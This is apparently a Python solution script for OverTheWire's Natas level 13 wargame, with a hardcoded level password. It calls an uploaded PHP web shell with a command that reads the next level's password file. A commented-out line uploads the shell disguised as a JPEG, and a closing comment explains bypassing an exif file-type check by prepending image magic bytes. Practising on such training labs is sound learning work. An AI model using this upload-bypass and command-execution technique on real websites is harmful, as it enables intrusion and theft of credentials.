#!/usr/bin/env python

import requests
import re


username='natas13'
password='jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY'

url = 'http://%s.natas.labs.overthewire.org/' %username
path = '/upload/cp3vapw89d.php?v= cat /etc/natas_webpass/natas14'
session = requests.session()
files = { 'file':open('natas12_rce.php', 'rb')}
response = requests.get(url + path, auth=(username, password))
# response = session.post(url, auth=(username,password), files = {'uploadedfile': open('natas13_rce_jpeg.php', 'rb')}, data= {'filename': 'natas13_rce_jpeg.php', 'MAX_FILE_SIZE': "1000"})
content = response.text
# print content

print re.findall('GIF8\n(.*)', content)[0]

# This is the same as last one, but the only difference here is that in the source-code of website they are using exif_filetype... It reads the first bew bytes of the file and determines the filetype. So we need to add some bytes to the start of the file in order to make the website feel like the script that we are uploading is not some script but an image.